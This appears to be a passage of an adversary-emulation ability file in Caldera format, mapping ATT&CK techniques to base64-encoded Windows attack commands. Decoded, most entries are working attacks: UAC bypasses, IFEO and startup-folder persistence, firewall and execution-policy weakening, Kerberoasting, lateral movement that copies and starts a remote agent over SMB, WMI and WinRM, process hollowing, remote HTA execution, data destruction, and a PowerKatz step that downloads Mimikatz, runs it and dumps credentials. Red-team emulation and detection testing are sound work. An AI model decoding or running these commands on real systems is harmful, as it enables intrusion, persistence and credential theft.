["cG93ZXJzaGVsbCBTdG9wLVByb2Nlc3MgLU5hbWUgY21kIC1Gb3JjZSAtRXJyb3JBY3Rpb24gSWdub3JlICYmIHBvd2Vyc2hlbGwgU3RvcC1Qcm9jZXNzIC1OYW1lIG1tYyAtRm9yY2UgLUVycm9yQWN0aW9uIElnbm9yZQ=="], "executor": "cmd", "access": {}, "description": "Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.\nNote: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor: James Forshaw\n\nType:\tAppInfo ALPC\n\nMethod: RAiLaunchAdminProcess and DebugObject\n\nTarget:\tAttacker defined\n\nComponent:\tAttacker defined\n\nImplementation:\tucmDebugObjectMethod\n\nUCM Method:\tUacMethodDebugObject\n\nhttps://github.com/hfiref0x/UACME\n", "variations": []}, {"test": "UkVHIEFERCAiSEtMTVxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93cyBOVFxDdXJyZW50VmVyc2lvblxJbWFnZSBGaWxlIEV4ZWN1dGlvbiBPcHRpb25zXCN7dGFyZ2V0X2JpbmFyeX0iIC92IEdsb2JhbEZsYWcgL3QgUkVHX0RXT1JEIC9kIDUxMiAmJiBSRUcgQUREICJIS0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIE5UXEN1cnJlbnRWZXJzaW9uXFNpbGVudFByb2Nlc3NFeGl0XCN7dGFyZ2V0X2JpbmFyeX0iIC92IFJlcG9ydGluZ01vZGUgL3QgUkVHX0RXT1JEIC9kIDEgJiYgUkVHIEFERCAiSEtMTVxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93cyBOVFxDdXJyZW50VmVyc2lvblxTaWxlbnRQcm9jZXNzRXhpdFwje3RhcmdldF9iaW5hcnl9IiAvdiBNb25pdG9yUHJvY2VzcyAvZCAiI3twYXlsb2FkX2JpbmFyeX0i", "ability_id": "1f0c1fba09ed682c35812052068b94f4", "technique_name": "Event Triggered Execution: Image File Execution Options Injection", "additional_info": {}, "privilege": "", "technique_id": "T1546.012", "platform": "windows", "name": "IFEO Global Flags", "requirements": [], "tactic": "multiple", "buckets": ["multiple"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["cmVnIGRlbGV0ZSAiSEtMTVxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93cyBOVFxDdXJyZW50VmVyc2lvblxJbWFnZSBGaWxlIEV4ZWN1dGlvbiBPcHRpb25zXEM6XFdpbmRvd3NcU3lzdGVtMzJcbm90ZXBhZC5leGUiIC92IEdsb2JhbEZsYWcgL2YgPm51bCAyPiYxICYmIHJlZyBkZWxldGUgIkhLTE1cU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3MgTlRcQ3VycmVudFZlcnNpb25cU2lsZW50UHJvY2Vzc0V4aXRcQzpcV2luZG93c1xTeXN0ZW0zMlxub3RlcGFkLmV4ZSIgL3YgUmVwb3J0aW5nTW9kZSAvZiA+bnVsIDI+JjEgJiYgcmVnIGRlbGV0ZSAiSEtMTVxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93cyBOVFxDdXJyZW50VmVyc2lvblxTaWxlbnRQcm9jZXNzRXhpdFxDOlxXaW5kb3dzXFN5c3RlbTMyXG5vdGVwYWQuZXhlIiAvdiBNb25pdG9yUHJvY2VzcyAvZiA+bnVsIDI+JjE="], "executor": "cmd", "access": {}, "description": "Leverage Global Flags Settings\n", "variations": []}, {"test": "Q29weS1JdGVtIGY3Y2UwOV9BdG9taWNUZXN0LmV4ZSAtRGVzdGluYXRpb24gIkM6XFVzZXJzXCRlbnY6VXNlck5hbWUiIC1Gb3JjZTsgbmV0c2ggYWR2ZmlyZXdhbGwgZmlyZXdhbGwgYWRkIHJ1bGUgbmFtZT0iQXRvbWljIFRlc3QiIGRpcj1pbiBhY3Rpb249YWxsb3cgcHJvZ3JhbT0iQzpcVXNlcnNcJGVudjpVc2VyTmFtZVxBdG9taWNUZXN0LmV4ZSIgZW5hYmxlPXllcw==", "ability_id": "41627f71f968225b9f162cb76d16bd9d", "technique_name": "Impair Defenses: Disable or Modify System Firewall", "additional_info": {}, "privilege": "", "technique_id": "T1562.004", "platform": "windows", "name": "Allow Executable Through Firewall Located in Non-Standard Location", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": ["f7ce09_AtomicTest.exe"], "cleanup": ["bmV0c2ggYWR2ZmlyZXdhbGwgZmlyZXdhbGwgZGVsZXRlIHJ1bGUgbmFtZT0iQXRvbWljIFRlc3QiIHwgT3V0LU51bGw7IFJlbW92ZS1JdGVtIEM6XFVzZXJzXCRlbnY6VXNlck5hbWVcQXRvbWljVGVzdC5leGUgLUVycm9yQWN0aW9uIElnbm9yZQ==", "UmVtb3ZlLUl0ZW0gLUZvcmNlIC1QYXRoICJmN2NlMDlfQXRvbWljVGVzdC5leGUi"], "executor": "psh", "access": {}, "description": "This test will attempt to allow an executable through the system firewall located in the Users directory", "variations": []}, {"test": "U2V0LUV4ZWN1dGlvblBvbGljeSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtU2NvcGUgTG9jYWxNYWNoaW5l", "ability_id": "cd8be0e6b873919da25530a2c7ea6750", "technique_name": "Modify Registry", "additional_info": {}, "privilege": "", "technique_id": "T1112", "platform": "windows", "name": "Change Powershell Execution Policy to Bypass", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["dHJ5IHsgU2V0LUV4ZWN1dGlvblBvbGljeSAtRXhlY3V0aW9uUG9saWN5IERlZmF1bHQgLVNjb3BlIExvY2FsTWFjaGluZSAtRm9yY2UgfSBjYXRjaCB7fQ=="], "executor": "psh", "access": {}, "description": "Attackers need to change the powershell execution policy in order to run their malicious powershell scripts.\nThey can either specify it during the execution of the powershell script or change the registry value for it.\n", "variations": []}, {"test": "Z2V0LWFkdXNlciAtZiAqIC1wciBEb2VzTm90UmVxdWlyZVByZUF1dGggfCB3aGVyZSB7JF8uRG9lc05vdFJlcXVpcmVQcmVBdXRoIC1lcSAkVFJVRX0=", "ability_id": "f5dd56d901db9f95668988426326bc3a", "technique_name": "Permission Groups Discovery: Domain Groups", "additional_info": {}, "privilege": "", "technique_id": "T1069.002", "platform": "windows", "name": "Enumerate Users Not Requiring Pre Auth (ASRepRoast)", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "When successful, accounts that do not require kerberos pre-auth will be returned\n", "variations": []}, {"test": "JHBhdGggPSAic2FuZGNhdC5nby13aW5kb3dzIjskZHJpdmUgPSAiXFwje3JlbW90ZS5ob3N0LmZxZG59XEMkIjtDb3B5LUl0ZW0gLXYgLVBhdGggJHBhdGggLURlc3RpbmF0aW9uICRkcml2ZSJcVXNlcnNcUHVibGljXHM0bmRjNHQuZXhlIjs=", "ability_id": "65048ec1-f7ca-49d3-9410-10813e472b30", "technique_name": "Remote Services: SMB/Windows Admin Shares", "additional_info": {}, "privilege": "", "technique_id": "T1021.002", "platform": "windows", "name": "Copy 54ndc47 (SMB)", "requirements": [{"relationship_match": [{"source": "remote.host.fqdn", "edge": "has_54ndc47_copy"}], "module": "plugins.stockpile.app.requirements.not_exists"}, {"relationship_match": [{"source": "remote.host.fqdn", "edge": "has_share"}], "module": "plugins.stockpile.app.requirements.basic"}, {"relationship_match": [{"source": "remote.host.fqdn"}], "module": "plugins.stockpile.app.requirements.no_backwards_movement"}], "tactic": "lateral-movement", "buckets": ["lateral-movement"], "timeout": 60, "uploads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.54ndc47_remote_copy", "relationships": [{"edge": "has_54ndc47_copy", "source": "remote.host.fqdn", "custom_parser_vals": {}, "target": ""}]}], "payloads": ["sandcat.go-windows"], "cleanup": ["JGRyaXZlID0gIlxcI3tyZW1vdGUuaG9zdC5mcWRufVxDJCI7ClJlbW92ZS1JdGVtIC1QYXRoICRkcml2ZSJcVXNlcnNcUHVibGljXHM0bmRjNHQuZXhlIiAtRm9yY2U7", "UmVtb3ZlLUl0ZW0gLUZvcmNlIC1QYXRoICJzYW5kY2F0LmdvLXdpbmRvd3Mi"], "executor": "psh", "access": {}, "description": "Copy 54ndc47 to remote host (SMB)", "variations": []}, {"test": "cHdk", "ability_id": "6e1a53c0-7352-4899-be35-fa7f364d5722", "technique_name": "File and Directory Discovery", "additional_info": {}, "privilege": "", "technique_id": "T1083", "platform": "windows", "name": "Print Working Directory", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Print the current working directory on the system", "variations": []}, {"test": "LiBjZDZkMDFfU3RhcnQtSG9sbG93LnBzMTsgJHBwaWQ9R2V0LVByb2Nlc3MgZXhwbG9yZXIgfCBzZWxlY3QgLWV4cGFuZCBpZDsgU3RhcnQtSG9sbG93IC1TcG9uc29yICJDOlxXaW5kb3dzXFN5c3RlbTMyXG5vdGVwYWQuZXhlIiAtSG9sbG93ICJDOlxXaW5kb3dzXFN5c3RlbTMyXGNtZC5leGUiIC1QYXJlbnRQSUQgJHBwaWQgLVZlcmJvc2U=", "ability_id": "06246b2963b7a0158e347dab3169174e", "technique_name": "Process Injection: Process Hollowing", "additional_info": {}, "privilege": "", "technique_id": "T1055.012", "platform": "windows", "name": "Process Hollowing using PowerShell", "requirements": [], "tactic": "multiple", "buckets": ["multiple"], "timeout": 60, "uploads": [], "parsers": [], "payloads": ["cd6d01_Start-Hollow.ps1"], "cleanup": ["U3RvcC1Qcm9jZXNzIC1OYW1lICJub3RlcGFkIiAtRXJyb3JBY3Rpb24gSWdub3Jl", "UmVtb3ZlLUl0ZW0gLUZvcmNlIC1QYXRoICJjZDZkMDFfU3RhcnQtSG9sbG93LnBzMSI="], "executor": "psh", "access": {}, "description": "This test uses PowerShell to create a Hollow from a PE on disk with explorer as the parent.\nCredit to FuzzySecurity (https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Start-Hollow.ps1)\n", "variations": []}, {"test": "JHZhciA9SW52b2tlLVdlYlJlcXVlc3QgImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9yZWRjYW5hcnljby9hdG9taWMtcmVkLXRlYW0vbWFzdGVyL2F0b21pY3MvVDEyMTguMDA1L3NyYy9UMTIxOC4wMDUuaHRhIjsgJHZhci5jb250ZW50fG91dC1maWxlICIkZW52OmFwcGRhdGFcTWljcm9zb2Z0XFdpbmRvd3NcU3RhcnQgTWVudVxQcm9ncmFtc1xTdGFydHVwXFQxMjE4LjAwNS5odGEiOyBtc2h0YSAiJGVudjphcHBkYXRhXE1pY3Jvc29mdFxXaW5kb3dzXFN0YXJ0IE1lbnVcUHJvZ3JhbXNcU3RhcnR1cFxUMTIxOC4wMDUuaHRhIg==", "ability_id": "c16cc1c3f28a6d143a23b2975448d32c", "technique_name": "Signed Binary Proxy Execution: Mshta", "additional_info": {}, "privilege": "", "technique_id": "T1218.005", "platform": "windows", "name": "Mshta Executes Remote HTML Application (HTA)", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["cmVtb3ZlLWl0ZW0gIiRlbnY6YXBwZGF0YVxNaWNyb3NvZnRcV2luZG93c1xTdGFydCBNZW51XFByb2dyYW1zXFN0YXJ0dXBcVDEyMTguMDA1Lmh0YSIgLUVycm9yQWN0aW9uIElnbm9yZQ=="], "executor": "psh", "access": {}, "description": "Execute an arbitrary remote HTA. Upon execution calc.exe will be launched.\n", "variations": []}, {"test": "Y21kLmV4ZSAvYyAibmV0IHVzZXIiID4+IEM6XFdpbmRvd3NcdGVtcFxoaXN0b3J5LmxvZztjbWQuZXhlIC9jICJ3aG9hbWkgL3ByaXYiID4+IEM6XFdpbmRvd3NcdGVtcFxoaXN0b3J5LmxvZztjbWQuZXhlIC9jICJuZXRzdGF0IC1hbm8iID4+IEM6XFdpbmRvd3NcdGVtcFxoaXN0b3J5LmxvZzs=", "ability_id": "55678719-e76e-4df9-92aa-10655bbd1cf4", "technique_name": "Command and Scripting Interpreter: PowerShell", "additional_info": {}, "privilege": "", "technique_id": "T1059.001", "platform": "windows", "name": "cmd.exe information gathering", "requirements": [], "tactic": "collection", "buckets": ["collection"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "User enumeration", "variations": []}, {"test": "JHVzZXJuYW1lID0gIiN7ZG9tYWluLnVzZXIubmFtZX0iOyRwYXNzd29yZCA9ICIje2RvbWFpbi51c2VyLnBhc3N3b3JkfSI7JHNlY3N0ciA9IE5ldy1PYmplY3QgLVR5cGVOYW1lIFN5c3RlbS5TZWN1cml0eS5TZWN1cmVTdHJpbmc7JHBhc3N3b3JkLlRvQ2hhckFycmF5KCkgfCBGb3JFYWNoLU9iamVjdCB7JHNlY3N0ci5BcHBlbmRDaGFyKCRfKX07JGNyZWQgPSBOZXctT2JqZWN0IC1UeXBlbmFtZSBTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbCAtQXJndW1lbnRsaXN0ICR1c2VybmFtZSwgJHNlY3N0cjskc2Vzc2lvbiA9IE5ldy1QU1Nlc3Npb24gLUNvbXB1dGVyTmFtZSAje3JlbW90ZS5ob3N0Lm5hbWV9IC1DcmVkZW50aWFsICRjcmVkO0ludm9rZS1Db21tYW5kIC1TZXNzaW9uICRzZXNzaW9uIC1TY3JpcHRCbG9ja3tzdGFydC1qb2IgLXNjcmlwdGJsb2Nre2NtZC5leGUgL2Mgc3RhcnQgQzpcVXNlcnNcUHVibGljXHN2Y2hvc3QuZXhlIC1zZXJ2ZXIgI3tzZXJ2ZXJ9IH19O1N0YXJ0LVNsZWVwIC1zIDU7UmVtb3ZlLVBTU2Vzc2lvbiAtU2Vzc2lvbiAkc2Vzc2lvbjs=", "ability_id": "41bb2b7a-75af-49fd-bd15-6c827df25921", "technique_name": "Remote Services: Windows Remote Management", "additional_info": {}, "privilege": "", "technique_id": "T1021.006", "platform": "windows", "name": "Start Agent (WinRM)", "requirements": [], "tactic": "lateral-movement", "buckets": ["lateral-movement"], "timeout": 60, "uploads": [], "parsers": [], "payloads": ["sandcat.go-windows"], "cleanup": ["JHVzZXJuYW1lID0gIiN7ZG9tYWluLnVzZXIubmFtZX0iOwokcGFzc3dvcmQgPSAiI3tkb21haW4udXNlci5wYXNzd29yZH0iOwokc2Vjc3RyID0gTmV3LU9iamVjdCAtVHlwZU5hbWUgU3lzdGVtLlNlY3VyaXR5LlNlY3VyZVN0cmluZzsKJHBhc3N3b3JkLlRvQ2hhckFycmF5KCkgfCBGb3JFYWNoLU9iamVjdCB7JHNlY3N0ci5BcHBlbmRDaGFyKCRfKX07CiRjcmVkID0gTmV3LU9iamVjdCAtVHlwZW5hbWUgU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWwgLUFyZ3VtZW50bGlzdCAkdXNlcm5hbWUsICRzZWNzdHI7CiRzZXNzaW9uID0gTmV3LVBTU2Vzc2lvbiAtQ29tcHV0ZXJOYW1lICN7cmVtb3RlLmhvc3QubmFtZX0gLUNyZWRlbnRpYWwgJGNyZWQ7Ckludm9rZS1Db21tYW5kIC1TZXNzaW9uICRzZXNzaW9uIC1TY3JpcHRCbG9ja3tzdGFydC1qb2IgLXNjcmlwdGJsb2Nre0dldC1Qcm9jZXNzIGNtZCB8IFdoZXJlLU9iamVjdCBQYXRoIC1lcSBDOlxVc2Vyc1xQdWJsaWNcc3ZjaG9zdC5leGUgfCBTdG9wLVByb2Nlc3N9fTsKU3RhcnQtU2xlZXAgLXMgNTsKUmVtb3ZlLVBTU2Vzc2lvbiAtU2Vzc2lvbiAkc2Vzc2lvbjs=", "UmVtb3ZlLUl0ZW0gLUZvcmNlIC1QYXRoICJzYW5kY2F0LmdvLXdpbmRvd3Mi"], "executor": "psh", "access": {}, "description": "Start Agent using WinRM (WinRM)", "variations": []}, {"test": "c3RhcnQgMGE0MDgxX0RERV9Eb2N1bWVudC5kb2N4", "ability_id": "e401dd1a8de06f4a52b66736c2050bb7", "technique_name": "Inter-Process Communication: Dynamic Data Exchange", "additional_info": {}, "privilege": "", "technique_id": "T1559.002", "platform": "windows", "name": "Execute PowerShell script via Word DDE", "requirements": [], "tactic": "execution", "buckets": ["execution"], "timeout": 60, "uploads": [], "parsers": [], "payloads": ["0a4081_DDE_Document.docx"], "cleanup": [], "executor": "cmd", "access": {}, "description": "When the word document opens it will prompt the user to click ok on a dialogue box, then attempt to run PowerShell with DDEAUTO to download and execute a powershell script\n", "variations": []}, {"test": "cG93ZXJzaGVsbCAtZXhlYyBieXBhc3MgLWUgU1FCdUFIWUFid0JyQUdVQUxRQlhBRzBBYVFCTkFHVUFkQUJvQUc4QVpBQWdBQzBBVUFCaEFIUUFhQUFnQUhjQWFRQnVBRE1BTWdCZkFIQUFjZ0J2QUdNQVpRQnpBSE1BSUFBdEFFNEFZUUJ0QUdVQUlBQmpBSElBWlFCaEFIUUFaUUFnQUMwQVFRQnlBR2NBZFFCdEFHVUFiZ0IwQUV3QWFRQnpBSFFBSUFCdUFHOEFkQUJsQUhBQVlRQmtBQzRBWlFCNEFHVUE=", "ability_id": "28004c307d9958351c450cb0384efaf9", "technique_name": "Windows Management Instrumentation", "additional_info": {}, "privilege": "", "technique_id": "T1047", "platform": "windows", "name": "Create a Process using WMI Query and an Encoded Command", "requirements": [], "tactic": "execution", "buckets": ["execution"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "Solarigate persistence is achieved via backdoors deployed via various techniques including using PowerShell with an EncodedCommand\n Powershell -nop -exec bypass -EncodedCommand <encoded command>\nWhere the \u2013EncodedCommand, once decoded, would resemble:\n  Invoke-WMIMethod win32_process -name create -argumentlist \u2018rundll32 c:\\windows\\idmu\\common\\ypprop.dll _XInitImageFuncPtrs\u2019 -ComputerName WORKSTATION\nThe EncodedCommand in this atomic is the following: Invoke-WmiMethod -Path win32_process -Name create -ArgumentList notepad.exe\nYou should expect to see notepad.exe running after execution of this test.\n[Solarigate Analysis from Microsoft](https://www.microsoft.com/security/blog/2020/12/18/analyzing-solorigate-the-compromised-dll-file-that-started-a-sophisticated-cyberattack-and-how-microsoft-defender-helps-protect/)\n", "variations": []}, {"test": "c2V0c3BuIC1UICVVU0VSRE5TRE9NQUlOJSAtUSAqLyo=", "ability_id": "a11f6f6ca99756b81eb4db198893f737", "technique_name": "Steal or Forge Kerberos Tickets: Kerberoasting", "additional_info": {}, "privilege": "", "technique_id": "T1558.003", "platform": "windows", "name": "Extract all accounts in use as SPN using setspn", "requirements": [], "tactic": "credential-access", "buckets": ["credential-access"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "The following test will utilize setspn to extract the Service Principal Names. This behavior is typically used during a kerberos or silver ticket attack. \nA successful execution will output all the SPNs for the related domain. \n", "variations": []}, {"test": "ZGVsIC9mICV0ZW1wJVxkZWxldGVtZV9UMTU1MS4wMDQ=", "ability_id": "c3a3d3282e88bb4f80109be9afbd6e94", "technique_name": "Indicator Removal on Host: File Deletion", "additional_info": {}, "privilege": "", "technique_id": "T1070.004", "platform": "windows", "name": "Delete a single file - Windows cmd", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "Delete a single file from the temporary directory using cmd.exe.\nUpon execution, no output will be displayed. Use File Explorer to verify the file was deleted.\n", "variations": []}, {"test": "Y21zdHAuZXhlIC9zIGIyNzM0MV9UMTIxOC4wMDNfdWFjYnlwYXNzLmluZiAvYXU=", "ability_id": "509c85cd52c782dd77c0ed919aeef4cb", "technique_name": "Signed Binary Proxy Execution: CMSTP", "additional_info": {}, "privilege": "", "technique_id": "T1218.003", "platform": "windows", "name": "CMSTP Executing UAC Bypass", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": ["b27341_T1218.003_uacbypass.inf"], "cleanup": [], "executor": "cmd", "access": {}, "description": "Adversaries may invoke cmd.exe (or other malicious commands) by embedding them in the RunPreSetupCommandsSection of an INF file\n", "variations": []}, {"test": "d21pYyAvbm9kZToje3JlbW90ZS5ob3N0LmlwfSAvdXNlcjoje2RvbWFpbi51c2VyLm5hbWV9IC9wYXNzd29yZDoje2RvbWFpbi51c2VyLnBhc3N3b3JkfSBwcm9jZXNzIGNhbGwgY3JlYXRlICJwb3dlcnNoZWxsLmV4ZSBDOlxVc2Vyc1xQdWJsaWNcc3ZjaG9zdC5leGUgLXNlcnZlciAje3NlcnZlcn0iOw==", "ability_id": "2a32e46f-5346-45d3-9475-52b857c05342", "technique_name": "Windows Management Instrumentation", "additional_info": {}, "privilege": "", "technique_id": "T1047", "platform": "windows", "name": "Start 54ndc47 (WMI)", "requirements": [{"relationship_match": [{"source": "domain.user.name", "edge": "has_password", "target": "domain.user.password"}], "module": "plugins.stockpile.app.requirements.basic"}], "tactic": "execution", "buckets": ["execution"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["d21pYyAvbm9kZToje3JlbW90ZS5ob3N0LmlwfSAvdXNlcjoje2RvbWFpbi51c2VyLm5hbWV9IC9wYXNzd29yZDoje2RvbWFpbi51c2VyLnBhc3N3b3JkfSBwcm9jZXNzIHdoZXJlICJFeGVjdXRhYmxlUGF0aD0nQzpcXFVzZXJzXFxQdWJsaWNcXHN2Y2hvc3QuZXhlJyIgY2FsbCB0ZXJtaW5hdGU7"], "executor": "psh", "access": {}, "description": "Remotely executes 54ndc47 over WMI", "variations": []}, {"test": "bmV0IHVzZXIgJiYgZGlyIGM6XFVzZXJzXCAmJiBjbWRrZXkuZXhlIC9saXN0ICYmIG5ldCBsb2NhbGdyb3VwICJVc2VycyIgJiYgbmV0IGxvY2FsZ3JvdXA=", "ability_id": "6334877e8e3ba48f7835d4856d90a282", "technique_name": "Account Discovery: Local Account", "additional_info": {}, "privilege": "", "technique_id": "T1087.001", "platform": "windows", "name": "Enumerate all accounts on Windows (Local)", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "Enumerate all accounts\nUpon execution, multiple enumeration commands will be run and their output displayed in the PowerShell session\n", "variations": []}, {"test": "UGF0aFRvQXRvbWljc0ZvbGRlclxUMTIyMFxiaW5cbXN4c2wuZXhlIGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9yZWRjYW5hcnljby9hdG9taWMtcmVkLXRlYW0vbWFzdGVyL2F0b21pY3MvVDEyMjAvc3JjL21zeHNseG1sZmlsZS54bWwgaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3JlZGNhbmFyeWNvL2F0b21pYy1yZWQtdGVhbS9tYXN0ZXIvYXRvbWljcy9UMTIyMC9zcmMvbXN4c2xzY3JpcHQueHNs", "ability_id": "ffce9bc5032640904cade26fd95826bf", "technique_name": "XSL Script Processing", "additional_info": {}, "privilege": "", "technique_id": "T1220", "platform": "windows", "name": "MSXSL Bypass using remote files", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["ZGVsIC1QYXRoIFBhdGhUb0F0b21pY3NGb2xkZXJcVDEyMjBcYmluXG1zeHNsLmV4ZSA+bnVsIDI+JjE="], "executor": "cmd", "access": {}, "description": "Executes the code specified within a XSL script tag during XSL transformation using a remote payload.\nRequires download of MSXSL.exe. No longer available from Microsoft.\n(Available via Internet Archive https://web.archive.org/web/20200825011623/https://www.microsoft.com/en-us/download/details.aspx?id=21714 )\nOpen Calculator.exe when test successfully executed, while AV turned off.\n", "variations": []}, {"test": "Q29weS1JdGVtIGI2ZGVjNV92YnNzdGFydHVwLnZicyAiJGVudjpBUFBEQVRBXE1pY3Jvc29mdFxXaW5kb3dzXFN0YXJ0IE1lbnVcUHJvZ3JhbXNcU3RhcnR1cFx2YnNzdGFydHVwLnZicyI7IENvcHktSXRlbSBiNmRlYzVfdmJzc3RhcnR1cC52YnMgIkM6XFByb2dyYW1EYXRhXE1pY3Jvc29mdFxXaW5kb3dzXFN0YXJ0IE1lbnVcUHJvZ3JhbXNcU3RhcnRVcFx2YnNzdGFydHVwLnZicyI7IGNzY3JpcHQuZXhlICIkZW52OkFQUERBVEFcTWljcm9zb2Z0XFdpbmRvd3NcU3RhcnQgTWVudVxQcm9ncmFtc1xTdGFydHVwXHZic3N0YXJ0dXAudmJzIjsgY3NjcmlwdC5leGUgIkM6XFByb2dyYW1EYXRhXE1pY3Jvc29mdFxXaW5kb3dzXFN0YXJ0IE1lbnVcUHJvZ3JhbXNcU3RhcnRVcFx2YnNzdGFydHVwLnZicyI=", "ability_id": "697e8a432031075e47cccba24417013d", "technique_name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder", "additional_info": {}, "privilege": "", "technique_id": "T1547.001", "platform": "windows", "name": "Suspicious vbs file run from startup Folder", "requirements": [], "tactic": "multiple", "buckets": ["multiple"], "timeout": 60, "uploads": [], "parsers": [], "payloads": ["b6dec5_vbsstartup.vbs"], "cleanup": ["UmVtb3ZlLUl0ZW0gIiRlbnY6QVBQREFUQVxNaWNyb3NvZnRcV2luZG93c1xTdGFydCBNZW51XFByb2dyYW1zXFN0YXJ0dXBcdmJzc3RhcnR1cC52YnMiIC1FcnJvckFjdGlvbiBJZ25vcmU7IFJlbW92ZS1JdGVtICJDOlxQcm9ncmFtRGF0YVxNaWNyb3NvZnRcV2luZG93c1xTdGFydCBNZW51XFByb2dyYW1zXFN0YXJ0VXBcdmJzc3RhcnR1cC52YnMiIC1FcnJvckFjdGlvbiBJZ25vcmU=", "UmVtb3ZlLUl0ZW0gLUZvcmNlIC1QYXRoICJiNmRlYzVfdmJzc3RhcnR1cC52YnMi"], "executor": "psh", "access": {}, "description": "vbs files can be placed in and ran from the startup folder to maintain persistance. Upon execution, \"T1547.001 Hello, World VBS!\" will be displayed twice. \nAdditionally, the new files can be viewed in the \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"\nfolder and will also run when the computer is restarted and the user logs in.\n", "variations": []}, {"test": "cmVnIHF1ZXJ5ICJIS0VZX0xPQ0FMX01BQ0hJTkVcU29mdHdhcmVcTWljcm9zb2Z0XEludGVybmV0IEV4cGxvcmVyIiAvdiBzdmNWZXJzaW9u", "ability_id": "8ddfaf982ab359cda13626b870ccb339", "technique_name": "Software Discovery", "additional_info": {}, "privilege": "", "technique_id": "T1518", "platform": "windows", "name": "Find and Display Internet Explorer Browser Version", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "Query the registry to determine the version of internet explorer installed on the system.\nUpon execution, version information about internet explorer will be displayed.\n", "variations": []}, {"test": "aWYgKC1ub3QgKFRlc3QtUGF0aCAkZW52OlRFTVBcVDE0ODUudHh0KSkgeyBOZXctSXRlbSAkZW52OlRFTVBcVDE0ODUudHh0IC1Gb3JjZSB9OyBJbnZva2UtRXhwcmVzc2lvbiAtQ29tbWFuZCAiJGVudjpURU1QXFNkZWxldGVcc2RlbGV0ZS5leGUgLWFjY2VwdGV1bGEgJGVudjpURU1QXFQxNDg1LnR4dCI=", "ability_id": "6e3c5f29ce339ebed8100d22e8b43875", "technique_name": "Data Destruction", "additional_info": {}, "privilege": "", "technique_id": "T1485", "platform": "windows", "name": "Windows - Overwrite file with Sysinternals SDelete", "requirements": [], "tactic": "impact", "buckets": ["impact"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Overwrites and deletes a file using Sysinternals SDelete. Upon successful execution, \"Files deleted: 1\" will be displayed in\nthe powershell session along with other information about the file that was deleted.\n", "variations": []}, {"test": "W1N5c3RlbS5OZXQuU2VydmljZVBvaW50TWFuYWdlcl06OlNlcnZlckNlcnRpZmljYXRlVmFsaWRhdGlvbkNhbGxiYWNrID0geyAkVHJ1ZSB9OyR3ZWIgPSAoTmV3LU9iamVjdCBTeXN0ZW0uTmV0LldlYkNsaWVudCk7JHJlc3VsdCA9ICR3ZWIuRG93bmxvYWRTdHJpbmcoImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9Qb3dlclNoZWxsTWFmaWEvUG93ZXJTcGxvaXQvNGM3YTIwMTZmYzc5MzFjZDM3MjczYzVkOGUxN2IxNmQ5NTk4NjdiMy9FeGZpbHRyYXRpb24vSW52b2tlLU1pbWlrYXR6LnBzMSIpO2lleCAkcmVzdWx0OyBJbnZva2UtTWltaWthdHogLUR1bXBDcmVkcw==", "ability_id": "baac2c6d-4652-4b7e-ab0a-f1bf246edd12", "technique_name": "OS Credential Dumping: LSASS Memory", "additional_info": {}, "privilege": "", "technique_id": "T1003.001", "platform": "windows", "name": "Run PowerKatz", "requirements": [], "tactic": "credential-access", "buckets": ["credential-access"], "timeout": 60, "uploads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.katz", "relationships": [{"edge": "has_password", "source": "domain.user.name", 